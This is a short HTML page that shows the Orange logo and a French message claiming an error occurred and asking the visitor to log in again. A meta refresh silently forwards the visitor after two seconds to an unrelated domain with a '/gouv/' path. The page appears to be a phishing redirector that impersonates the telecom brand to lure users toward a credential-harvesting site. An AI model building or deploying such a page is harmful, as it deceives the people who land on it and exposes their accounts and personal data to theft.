<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="2;url=https://espacefacturationdeviscompta.info/gouv/">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            text-align: center;
        }

        .centered {
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }

        .animated-logo {
            width: 100px;
            height: 100px;
            animation: spin 2s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        p {
            font-size: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="centered">
            <img src="https://c.woopic.com/small-logo-orange.svg" class="animated-logo">
        </div>
        <p>Une erreur est survenue, Veuillez vous reconnecter.</p>
    </div>
</body>
</html>
